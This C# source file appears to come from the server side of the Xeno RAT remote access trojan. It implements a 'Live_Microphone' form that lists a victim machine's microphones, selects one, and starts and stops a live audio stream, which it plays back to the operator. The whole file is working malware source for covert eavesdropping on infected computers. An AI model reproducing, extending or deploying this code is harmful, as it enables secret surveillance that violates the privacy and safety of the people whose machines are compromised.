using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using static System.Windows.Forms.VisualStyles.VisualStyleElement;
using NAudio.Wave;

namespace xeno_rat_server.Forms
{
    public partial class Live_Microphone : Form
    {
        Node client;
        Node MicNode;
        AudioPlayer player = new AudioPlayer(new WaveFormat(44100, 16, 2));
        string[] MicroPhones;
        bool playing = false;

        public Live_Microphone(Node _client)
        {
            client = _client;
            InitializeComponent();
            client.AddTempOnDisconnect(TempOnDisconnect);
            InitializeAsync();
        }
        private async Task InitializeAsync() 
        {
            MicNode = await CreateMicNode();
            MicNode.AddTempOnDisconnect(TempOnDisconnect);
            await RefreshMics();
            RecvThread();
        }
        public async Task RecvThread()
        {
            while (MicNode.Connected())
            {
                byte[] data = await MicNode.ReceiveAsync();
                if (data == null)
                {
                    break;
                }
                if (playing) 
                {
                    player.AddAudio(data);
                }
            }
        }
        public void TempOnDisconnect(Node node)
        {
            if (node == client || (node==MicNode && MicNode!=null))
            {
                client?.Disconnect();
                MicNode?.Disconnect();
                if (!this.IsDisposed)
                {
                    this.BeginInvoke((MethodInvoker)(() =>
                    {
                        this.Close();
                    }));
                }
            }
        }
        private async Task<Node> CreateMicNode()
        {
            if (MicNode != null) 
            {
                return MicNode;
            }
            await client.SendAsync(new byte[] { 5 });
            Node SubSubNode = await client.Parent.CreateSubNodeAsync(2);
            int id = await Utils.SetType2setIdAsync(SubSubNode);
            if (id != -1)
            {
                await Utils.Type2returnAsync(SubSubNode);
                byte[] a = SubSubNode.sock.IntToBytes(id);
                await client.SendAsync(a);
                byte[] found = await client.ReceiveAsync();
                if (found == null || found[0] == 0)
                {
                    SubSubNode.Disconnect();
                    return null;
                }
            }
            else
            {
                SubSubNode.Disconnect();
                return null;
            }
            return SubSubNode;
        }
        public async Task RefreshMics()
        {
            string[] mics = await GetMicroPhones();

            comboBox1.Items.Clear();
            comboBox1.Items.AddRange(mics);
            if (mics.Length == 0)
            {
                button2.Enabled = false;
            }
            else 
            { 
                button2.Enabled = true;
                await SetMicroPhone(0);
            }
        }
        public async Task<string[]> GetMicroPhones()
        {
            byte[] opcode = new byte[] { 1 };
            await client.SendAsync(opcode);
            int mics = client.sock.BytesToInt(await client.ReceiveAsync());
            string[] result = new string[mics];
            for (int i = 0; i<mics; i++) 
            {
                result[i]=Encoding.UTF8.GetString(await client.ReceiveAsync());
            }
            MicroPhones = result;
            return result;
        }
        public async Task SetMicroPhone(int index) 
        {
            byte[] opcode = new byte[] { 2 };
            await client.SendAsync(opcode);
            await client.SendAsync(client.sock.IntToBytes(index));
        }
        private void Live_Microphone_Load(object sender, EventArgs e)
        {

        }

        private async void button2_Click(object sender, EventArgs e)
        {
            button3.Enabled = true;
            button2.Enabled = false;//start
            button1.Enabled = false;
            player.Start();
            await client.SendAsync(new byte[] { 3 });
            playing = true;

        }

        private async void button3_Click(object sender, EventArgs e)
        {
            button2.Enabled = true;
            button3.Enabled = false;//stop
            button1.Enabled = true;
            player.Stop();
            await client.SendAsync(new byte[] { 4 });
            playing = false;

        }

        private async void button1_Click(object sender, EventArgs e)
        {
            await RefreshMics();
            //refresh
        }

        private async void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            int selectedIndex = comboBox1.SelectedIndex;
            if (selectedIndex != -1) 
            {
                await SetMicroPhone(selectedIndex);
            }
        }
        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            player.Dispose();
        }
    }
    class AudioPlayer
    {
        private BufferedWaveProvider waveProvider;
        private WaveOutEvent waveOut;

        public AudioPlayer(WaveFormat waveFormat)
        {
            waveProvider = new BufferedWaveProvider(waveFormat);
            waveOut = new WaveOutEvent();
            waveOut.Init(waveProvider);
        }

        public void Start()
        {
            waveProvider.ClearBuffer();
            waveOut.Play();
        }

        public void Stop()
        {
            waveOut.Stop();
            waveProvider.ClearBuffer();
        }
        public void Dispose() 
        {
            Stop();
            waveOut.Dispose();
        }
        public void AddAudio(byte[] audioData)
        {
            waveProvider.AddSamples(audioData, 0, audioData.Length);
        }
    }
}
